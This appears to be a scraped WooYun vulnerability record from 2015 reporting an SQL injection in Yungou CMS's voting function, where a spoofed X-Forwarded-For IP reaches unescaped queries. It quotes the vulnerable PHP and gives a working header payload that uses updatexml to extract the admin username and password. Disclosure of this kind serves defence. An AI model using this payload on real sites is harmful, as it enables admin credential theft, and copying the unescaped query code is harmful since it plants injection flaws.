{"id": 38960, "wybug_id": "wooyun-2015-095086", "wybug_title": "云购Cms修复不当仍存在Sql注入", "wybug_corp": "yungoucms.com", "wybug_author": "浅蓝", "wybug_date": "2015-02-05 18:44", "wybug_open_date": "2015-05-06 18:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-06：\t细节向公众公开  简要描述： rt 详细说明：  根据雨牛的 WooYun: Yungoucms Sql Injection 第一枚 我看了下相同位置的代码\npublic function checked_option(){\t\t\t  \t\t $mysql_model=System::load_sys_class('model');\t\t $title=\"投票\";\t \t     $curtime=time();\t\t $option_id=abs(intval($_POST['radio'])); \t\t $vote_id= abs(intval($_POST['vote_id']));\t\t $clientip=_get_ip();\t\t $sqlallowguest='';\t\t $sqlinterval=0;\t\t  \t\t \t\t//查询投票项的规则和规定时间\t\t $vote_subjects=$mysql_model->GetOne(\"select * from `@#_vote_subject` where `vote_id`='$vote_id'\");         \t\t $sqlallowguest=$vote_subjects['vote_allowguest'];//1允许游客投票 0不允许游客投票\t\t $sqlinterval=$vote_subjects['vote_interval'];  //N天后可再次投票，0 表示此IP地址只能投一次\t\t if(1==$sqlallowguest){//判断是否允许游客投票\t\t \t\t      \t\t \t\t\t  $vote_activer=$mysql_model->GetOne(\"select * from `@#_vote_activer` where `vote_id`='$vote_id' and `ip`='$clientip' order by subtime desc\"); \t\t\t if(!empty($vote_activer)){//判断该ip用户已经投过票\t\t\t    \t\t\t\t //上次投票间隔天数\t\t\t       $datenum=($curtime-$vote_activer['subtime'])/(60*60*24);\t\t\t\t\t\t\t    if($sqlinterval==0 || $datenum<=$sqlinterval){ //0 表示此IP地址只能投一次\t\t\t\t   _message(\"您已参加此次投票活动\",null,3);\t\t\t\t}else{\t\t\t\t\t\t\t\t //查出新增加的票数\t\t \t\t\t\t\t$vote_option=$mysql_model->GetList(\"select * from `@#_vote_option` where  `option_id`='$option_id' \");\t\t\t\t\t  \t\t\t\t\t$option_number=$vote_option[0]['option_number']+1;\t\t\t\t\t  \t\t\t\t\t $mysql_model->Query(\"UPDATE `@#_vote_option` SET option_number='$option_number' where `vote_id`='$vote_id' and `option_id`='$option_id' \");\t\t\t\t\t \t\t \t\t\t        $mysql_model->Query(\"INSERT INTO `@#_vote_activer`(option_id,vote_id,userid,ip,subtime) VALUES('$option_id','$vote_id','$this->userid','$clientip','$curtime') \");\t\t\t     _message(\"投票成功，感谢您的参与\",null,3); \t\t\t\t}\t\t       \t\t\t}else{\t\t\t \t\t\t\t //查出新增加的票数\t\t \t\t\t\t$vote_option=$mysql_model->GetList(\"select * from `@#_vote_option` where  `option_id`='$option_id' \");\t\t\t\t\t  \t\t\t\t  $option_number=$vote_option[0]['option_number']+1;\t\t\t\t\t  \t\t\t\t $mysql_model->Query(\"UPDATE `@#_vote_option` SET option_number='$option_number' where `vote_id`='$vote_id' and `option_id`='$option_id' \");\t\t\t\t\t \t\t\t\t\t \t\t\t    $mysql_model->Query(\"INSERT INTO `@#_vote_activer`(option_id,vote_id,userid,ip,subtime) VALUES('$option_id','$vote_id','$this->userid','$clientip','$curtime') \");\t\t\t     _message(\"投票成功，感谢您的参与\",null,3); \t\t\t }\t\t\t \t\t \t\t }else{\t    \t\t\t if($this->userid==''){\t\t\t    _message(\"您没有投票权限，请登录后投票！\",null,3); \t\t\t\texit();\t\t\t }\t\t\t $vote_activer=$mysql_model->GetOne(\"select * from `@#_vote_activer` where `vote_id`='$vote_id' and `userid`='$this->userid'\");\t\t\t if(!empty($vote_activer)){//判断该用户已经投过票\t\t\t    \t\t\t\t //上次投票间隔天数\t\t\t       $datenum=($curtime-$vote_activer['subtime'])/(60*60*24);\t\t\t\t  \t\t\t\t\t\t\t    if($sqlinterval==0 || $datenum<=$sqlinterval){ //0 表示此IP地址只能投一次\t\t\t\t   _message(\"您已参加此次投票活动\",null,3);\t\t\t\t}else{\t\t\t\t//查出新增加的票数\t\t \t\t\t\t$vote_option=$mysql_model->GetList(\"select * from `@#_vote_option` where  `option_id`='$option_id' \");\t\t\t\t\t  \t\t\t\t  $option_number=$vote_option[0]['option_number']+1;\t\t\t\t\t  \t\t\t\t $mysql_model->Query(\"UPDATE `@#_vote_option` SET option_number='$option_number' where `vote_id`='$vote_id' and `option_id`='$option_id' \");\t\t\t\t \t\t\t     $mysql_model->Query(\"INSERT INTO `@#_vote_activer`(option_id,vote_id,userid,ip,subtime) VALUES('$option_id','$vote_id','$this->userid','$clientip','$curtime') \");\t\t\t     _message(\"投票成功，感谢您的参与\",null,3); \t\t\t\t}\t\t\t       \t\t\t }else{\t\t\t \t //查出新增加的票数\t\t \t\t\t\t$vote_option=$mysql_model->GetList(\"select * from `@#_vote_option` where  `option_id`='$option_id' \");\t\t\t\t\t  \t\t\t\t  $option_number=$vote_option[0]['option_number']+1;\t\t\t\t\t  \t\t\t\t $mysql_model->Query(\"UPDATE `@#_vote_option` SET option_number='$option_number' where `vote_id`='$vote_id' and `option_id`='$option_id' \");\t\t\t\t \t\t\t    $mysql_model->Query(\"INSERT INTO `@#_vote_activer`(option_id,vote_id,userid,ip,subtime) VALUES('$option_id','$vote_id','$this->userid','$clientip','$curtime') \");\t\t\t     _message(\"投票成功，感谢您的参与\",null,3); \t\t\t }\t\t }\n\n$clientip=_get_ip()\n再看看 _get_ip()函数/*获取客户端ip*/\nfunction _get_ip(){\t\tif (isset($_SERVER['HTTP_CLIENT_IP']) && strcasecmp($_SERVER['HTTP_CLIENT_IP'], \"unknown\")) \t\t\t$ip = $_SERVER['HTTP_CLIENT_IP']; \t\telse if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && strcasecmp($_SERVER['HTTP_X_FORWARDED_FOR'], \"unknown\")) \t\t\t$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; \t\telse if (isset($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\")) \t\t\t$ip = $_SERVER['REMOTE_ADDR']; \t\telse if (isset($_SERVER['REMOTE_ADDR']) && isset($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\")) \t\t\t$ip = $_SERVER['REMOTE_ADDR']; \t\telse $ip = \"\"; \t\treturn ($ip);}\n把xff改为 1.1.1.1'or updatexml(1,concat(0x5e24,(select concat(username,0x23,userpass) from go_admin limit 0,1),0x5e24),1) or' 登录后打开 http://localhost/yungou/?/vote/vote/checked_option\n\n   漏洞证明：  \n\n   修复方案：  转义   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-02-05 18:49 厂商回复： 是的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-05 18:47 |    \t\t云购CMS(乌云厂商)\t\t \n  去 ,    \n     2015-02-05 20:55 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  回复好快啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}